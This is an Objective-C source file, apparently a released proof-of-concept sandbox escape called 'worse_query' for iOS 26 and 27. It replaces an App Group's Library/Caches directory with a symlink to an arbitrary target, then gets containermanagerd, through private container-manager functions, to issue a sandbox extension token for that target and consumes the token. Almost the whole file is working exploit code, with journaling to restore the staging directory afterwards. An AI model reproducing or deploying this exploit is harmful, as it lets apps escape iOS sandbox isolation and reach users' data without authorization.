//
//  worse_query.m
//  worse_query
//
//  Created by Taj C on 8/20/26.
//

/*
     worse_query - A sandbox escape PoC for iOS 26 and 27, again.
     Copyright (C) 2026 Taj C (forcequit)

     This program is free software: you can redistribute it and/or modify
     it under the terms of the GNU General Public License as published by
     the Free Software Foundation, either version 3 of the License, or
     (at your option) any later version.

     This program is distributed in the hope that it will be useful,
     but WITHOUT ANY WARRANTY; without even the implied warranty of
     MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
     GNU General Public License for more details.

     You should have received a copy of the GNU General Public License
     along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

#import <Foundation/Foundation.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <xpc/xpc.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include "worse_query.h"

typedef void *(*container_query_create_fn)(void);
typedef void (*container_query_set_class_fn)(void *, uint64_t);
typedef void (*container_query_set_identifiers_fn)(void *, xpc_object_t);
typedef void (*container_query_set_flags_fn)(void *, uint64_t);
typedef void (*container_query_set_part_fn)(void *, uint64_t);
typedef void *(*container_query_get_single_result_fn)(void *);
typedef void (*container_query_free_fn)(void *);
typedef char *(*container_copy_sandbox_token_fn)(void *);
typedef int64_t (*sandbox_extension_consume_fn)(const char *);
typedef int (*sandbox_extension_release_fn)(int64_t);

// Only a recorded transaction may be recovered. Unrecognized legacy backups,
// changed paths or replacement directories remain untouched and fail closed.
static _Thread_local int64_t WQStageError;

int64_t WQCacheStageLastError(void) { return WQStageError; }

static BOOL WQStageFail(int64_t code) {
    WQStageError = code;
    return NO;
}

static NSString *WQCacheBackupPath(NSString *caches) {
    return [caches stringByAppendingString:@".wq-preserved"];
}

static NSString *WQJournalPath(NSString *caches) {
    return [caches stringByAppendingString:@".wq-transaction.plist"];
}

static NSString *WQPathIdentity(NSString *path) {
    NSString *value = path.stringByStandardizingPath;
    return [value hasPrefix:@"/private/var/"] ? [value substringFromIndex:8] : value;
}

static BOOL WQPathStat(NSString *path, struct stat *info) {
    return lstat(path.fileSystemRepresentation, info) == 0;
}

static BOOL WQSameDirectory(struct stat info, NSNumber *device, NSNumber *inode) {
    return S_ISDIR(info.st_mode) && (uint64_t)info.st_dev == device.unsignedLongLongValue &&
        (uint64_t)info.st_ino == inode.unsignedLongLongValue;
}

static BOOL WQPrepareParent(NSString *caches, BOOL create, struct stat *parent) {
    if (!caches.isAbsolutePath || ![caches.lastPathComponent isEqualToString:@"Caches"] ||
        ![[caches stringByDeletingLastPathComponent].lastPathComponent isEqualToString:@"Library"])
        return WQStageFail(-12);
    NSString *path = caches.stringByDeletingLastPathComponent;
    if (!WQPathStat(path, parent)) {
        if (errno != ENOENT) return WQStageFail(-12);
        if (!create) return YES;
        // Create only Library in the existing, already signed App Group.
        if (![[NSFileManager defaultManager] createDirectoryAtPath:path
             withIntermediateDirectories:NO attributes:nil error:nil] || !WQPathStat(path, parent))
            return WQStageFail(-12);
    }
    return S_ISDIR(parent->st_mode) ? YES : WQStageFail(-12);
}

static BOOL WQWriteJournal(NSString *path, NSDictionary *record) {
    NSData *data = [NSPropertyListSerialization dataWithPropertyList:record
                    format:NSPropertyListBinaryFormat_v1_0 options:0 error:nil];
    if (!data || data.length > 16384) return WQStageFail(-12);
    int fd = open(path.fileSystemRepresentation, O_WRONLY | O_CREAT | O_EXCL | O_NOFOLLOW | O_CLOEXEC, 0600);
    if (fd < 0) return WQStageFail(-12);
    const uint8_t *bytes = data.bytes;
    NSUInteger done = 0;
    while (done < data.length) {
        ssize_t n = write(fd, bytes + done, data.length - done);
        if (n < 0 && errno == EINTR) continue;
        if (n <= 0) break;
        done += (NSUInteger)n;
    }
    BOOL ok = done == data.length && fsync(fd) == 0;
    close(fd);
    if (!ok) {
        // Nothing has been moved yet. Remove only the journal we just created.
        unlink(path.fileSystemRepresentation);
        return WQStageFail(-12);
    }
    return YES;
}

static NSDictionary *WQReadJournal(NSString *path, struct stat *identity) {
    int fd = open(path.fileSystemRepresentation, O_RDONLY | O_NOFOLLOW | O_NONBLOCK | O_CLOEXEC);
    if (fd < 0) return nil;
    if (fstat(fd, identity) != 0 || !S_ISREG(identity->st_mode) ||
        identity->st_size <= 0 || identity->st_size > 16384) { close(fd); return nil; }
    NSMutableData *data = [NSMutableData dataWithLength:(NSUInteger)identity->st_size];
    NSUInteger done = 0;
    while (done < data.length) {
        ssize_t n = read(fd, (uint8_t *)data.mutableBytes + done, data.length - done);
        if (n < 0 && errno == EINTR) continue;
        if (n <= 0) break;
        done += (NSUInteger)n;
    }
    close(fd);
    if (done != data.length) return nil;
    id record = [NSPropertyListSerialization propertyListWithData:data options:0 format:nil error:nil];
    return [record isKindOfClass:NSDictionary.class] ? record : nil;
}

static BOOL WQValidJournal(NSDictionary *record, NSString *caches, struct stat parent) {
    for (NSString *key in @[@"version", @"parentDevice", @"parentInode", @"hadCaches", @"device", @"inode"])
        if (![record[key] isKindOfClass:NSNumber.class]) return NO;
    if (![record[@"caches"] isKindOfClass:NSString.class] || ![record[@"target"] isKindOfClass:NSString.class]) return NO;
    return [record[@"version"] integerValue] == 1 &&
        [record[@"caches"] isEqualToString:WQPathIdentity(caches)] &&
        [record[@"target"] length] > 0 &&
        WQSameDirectory(parent, record[@"parentDevice"], record[@"parentInode"]);
}

static BOOL WQRemoveJournal(NSString *path, struct stat original) {
    struct stat current;
    if (!WQPathStat(path, &current) || !S_ISREG(current.st_mode) ||
        current.st_dev != original.st_dev || current.st_ino != original.st_ino)
        return WQStageFail(-11);
    return unlink(path.fileSystemRepresentation) == 0 ? YES : WQStageFail(-11);
}

BOOL WQCacheStageRecover(NSString *caches) {
    WQStageError = 0;
    struct stat parent = {0};
    if (!WQPrepareParent(caches, NO, &parent)) return NO;
    NSString *backup = WQCacheBackupPath(caches), *journal = WQJournalPath(caches);
    struct stat journalInfo, cacheInfo, backupInfo;
    BOOL hasJournal = WQPathStat(journal, &journalInfo);
    if (!hasJournal && errno != ENOENT) return WQStageFail(-12);
    BOOL hasBackup = WQPathStat(backup, &backupInfo);
    if (!hasBackup && errno != ENOENT) return WQStageFail(-12);
    BOOL hasCaches = WQPathStat(caches, &cacheInfo);
    if (!hasCaches && errno != ENOENT) return WQStageFail(-12);
    if (!hasJournal) {
        if (hasBackup) return WQStageFail(-9);
        if (hasCaches && !S_ISDIR(cacheInfo.st_mode)) return WQStageFail(-10);
        return YES;
    }
    NSDictionary *record = WQReadJournal(journal, &journalInfo);
    if (!record || !WQValidJournal(record, caches, parent)) return WQStageFail(-12);
    BOOL hadCaches = [record[@"hadCaches"] boolValue];
    NSFileManager *files = [NSFileManager defaultManager];
    if (hadCaches) {
        if (!hasBackup) {
            // The move did not begin, or restoration completed before a crash.
            if (!hasCaches || !WQSameDirectory(cacheInfo, record[@"device"], record[@"inode"]))
                return WQStageFail(-11);
            return WQRemoveJournal(journal, journalInfo);
        }
        if (!WQSameDirectory(backupInfo, record[@"device"], record[@"inode"])) return WQStageFail(-11);
    } else if (hasBackup) {
        return WQStageFail(-11);
    }

    if (hasCaches) {
        if (!hadCaches && S_ISDIR(cacheInfo.st_mode)) {
            // A new real cache directory may contain data. Preserve it.
            return WQRemoveJournal(journal, journalInfo);
        }
        if (!S_ISLNK(cacheInfo.st_mode)) return WQStageFail(-10);
        NSString *destination = [files destinationOfSymbolicLinkAtPath:caches error:nil];
        if (![destination isEqualToString:record[@"target"]]) return WQStageFail(-10);
        // unlink never traverses the external target.
        if (unlink(caches.fileSystemRepresentation) != 0) return WQStageFail(-11);
    }
    BOOL restored = hadCaches
        ? [files moveItemAtPath:backup toPath:caches error:nil]
        : [files createDirectoryAtPath:caches withIntermediateDirectories:NO attributes:nil error:nil];
    if (!restored) return WQStageFail(-11);
    return WQRemoveJournal(journal, journalInfo);
}

BOOL WQCacheStageBegin(NSString *caches, NSString *target) {
    WQStageError = 0;
    if (caches.length == 0 || target.length == 0) return WQStageFail(-12);
    if (!WQCacheStageRecover(caches)) return NO;
    struct stat parent = {0}, original = {0};
    if (!WQPrepareParent(caches, YES, &parent)) return NO;
    BOOL preserved = WQPathStat(caches, &original);
    if (!preserved && errno != ENOENT) return WQStageFail(-12);
    if (preserved && !S_ISDIR(original.st_mode)) return WQStageFail(-10);
    NSDictionary *record = @{
        @"version": @1, @"caches": WQPathIdentity(caches), @"target": target,
        @"parentDevice": @((uint64_t)parent.st_dev), @"parentInode": @((uint64_t)parent.st_ino),
        @"hadCaches": @(preserved), @"device": @((uint64_t)original.st_dev), @"inode": @((uint64_t)original.st_ino)
    };
    if (!WQWriteJournal(WQJournalPath(caches), record)) return NO;
    NSFileManager *files = [NSFileManager defaultManager];
    NSString *backup = WQCacheBackupPath(caches);
    if (preserved && ![files moveItemAtPath:caches toPath:backup error:nil]) {
        WQCacheStageRecover(caches);
        return WQStageFail(-11);
    }
    if (![files createSymbolicLinkAtPath:caches withDestinationPath:target error:nil]) {
        if (!WQCacheStageRecover(caches)) return NO;
        return WQStageFail(-4);
    }
    return YES;
}

BOOL WQCacheStageEnd(NSString *caches, NSString *target) {
    WQStageError = 0;
    if (caches.length == 0 || target.length == 0) return WQStageFail(-12);
    struct stat journalInfo;
    NSDictionary *record = WQReadJournal(WQJournalPath(caches), &journalInfo);
    if (!record || ![record[@"target"] isEqual:target]) return WQStageFail(-10);
    return WQCacheStageRecover(caches);
}

// So, who's ready for round two?
int64_t worse_query(NSString *target, NSString *group, bool alt_flags, bool create_dir) {
    // Check if the target exists
    if (!create_dir) {
        struct stat st;
        if (lstat(target.fileSystemRepresentation, &st) != 0) return -255; // Nothing exists at this path, and create_dir is false
    }
    
    // Get the App Group's path
    // An App Group identifier you control is required for this
    NSFileManager *files = [NSFileManager defaultManager];
    NSURL *groupRoot = [files containerURLForSecurityApplicationGroupIdentifier: group];
    if (!groupRoot) return -1; // App Group doesn't exist or we can't access it
    NSString *caches = [[groupRoot URLByAppendingPathComponent: @"Library/Caches"] path];
    
    if (!WQCacheStageRecover(caches)) return WQCacheStageLastError();

    // Resolve functions
    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) return -2; // dlopen failed?
    
    container_query_create_fn query_create = (container_query_create_fn)dlsym(mgr, "container_query_create");
    container_query_set_class_fn query_set_class = (container_query_set_class_fn)dlsym(mgr, "container_query_set_class");
    container_query_set_identifiers_fn query_set_group_identifiers = (container_query_set_identifiers_fn)dlsym(mgr, "container_query_set_group_identifiers");
    container_query_set_flags_fn query_set_flags = (container_query_set_flags_fn)dlsym(mgr, "container_query_operation_set_flags");
    container_query_set_part_fn query_set_part = (container_query_set_part_fn)dlsym(mgr, "container_query_operation_set_part");
    container_query_get_single_result_fn query_get_single_result = (container_query_get_single_result_fn)dlsym(mgr, "container_query_get_single_result");
    container_query_free_fn query_free = (container_query_free_fn)dlsym(mgr, "container_query_free");
    container_copy_sandbox_token_fn copy_sandbox_token = (container_copy_sandbox_token_fn)dlsym(mgr, "container_copy_sandbox_token");
    sandbox_extension_consume_fn consume_extension = (sandbox_extension_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    if (!query_create || !query_set_class || !query_set_group_identifiers || !query_set_flags || !query_set_part || !query_get_single_result || !query_free || !copy_sandbox_token || !consume_extension) {
        dlclose(mgr);
        return -2; // Failed to resolve a function (unsupported OS)
    }
    
    // Create query
    void *query = query_create();
    if (!query) {
        dlclose(mgr);
        return -3; // Failed to create query
    }
    
    // Set up query
    xpc_object_t identifier;
    query_set_class(query, 7); // We're only using class 7 here (appGroup), which goes to containermanagerd
    identifier = xpc_string_create(group.UTF8String);
    query_set_group_identifiers(query, identifier);
#if !OS_OBJECT_USE_OBJC
    // Match the bridge's XPC ownership rules on non-Objective-C runtimes.
    xpc_release(identifier);
#endif
    query_set_part(query, 3); // The query's part sets our base path, part 3 is Library/Caches
    if (alt_flags) {
        query_set_flags(query, 0x0000000800000000ULL); // Accessing App Group containers on iOS 26.x needs different flags, for whatever reason
    } else {
        query_set_flags(query, 0x0000008000000000ULL);
    }
    
    // Only the staging directory handling changes: preserve its contents.
    // Query class, part, flags, target and token flow remain unchanged.
    if (!WQCacheStageBegin(caches, target)) {
        query_free(query);
        dlclose(mgr);
        return WQCacheStageLastError();
    }
    
    // Send our query over
    void *result = query_get_single_result(query);
    if (!result) {
        query_free(query);
        dlclose(mgr);
        return WQCacheStageEnd(caches, target) ? -5 : WQCacheStageLastError(); // Query rejected by containermanagerd
    }
    char *token = copy_sandbox_token(result);
    if (!token) {
        query_free(query);
        dlclose(mgr);
        return WQCacheStageEnd(caches, target) ? -6 : WQCacheStageLastError(); // Kernel refused to issue a sandbox extension
    }
    
    // Consume sandbox extension and clean up
    int64_t handle = consume_extension(token);
    query_free(query);
    free(token);
    dlclose(mgr);
    if (!WQCacheStageEnd(caches, target)) {
        if (handle > 0) worse_query_release(handle);
        return WQCacheStageLastError();
    }

    return handle;
}

// You should probably call this when you're done
void worse_query_release(int64_t handle) {
    if (handle < 0) return;
    sandbox_extension_release_fn release_extension = (sandbox_extension_release_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    if (release_extension) release_extension(handle);
}
